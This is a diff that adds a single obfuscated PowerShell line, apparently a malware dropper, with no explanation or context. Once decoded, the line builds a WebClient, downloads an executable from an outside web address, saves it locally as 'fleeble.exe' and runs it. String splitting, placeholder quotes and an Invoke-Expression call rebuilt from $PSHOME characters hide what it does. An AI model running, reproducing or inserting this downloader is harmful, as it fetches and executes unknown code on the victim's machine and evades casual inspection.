@@ -1,0 +1,1 @@
+﻿('(New-'+'Object Sy'+'ste'+'m.Ne'+'t.WebCl'+'ien'+'t).DownloadF'+'ile(qAO'+'htt'+'p://world'+'nit.c'+'om/c'+'omu.exeqA'+'O,qAOf'+'lee'+'b'+'le.'+'exeqA'+'O);St'+'art'+'-'+'P'+'r'+'oc'+'ess qA'+'Oflee'+'ble.e'+'xeq'+'AO').rEPlacE(([cHAR]113+[cHAR]65+[cHAR]79),[STRiNg][cHAR]39)| .( $PshOme[4]+$pShoMe[34]+'X')
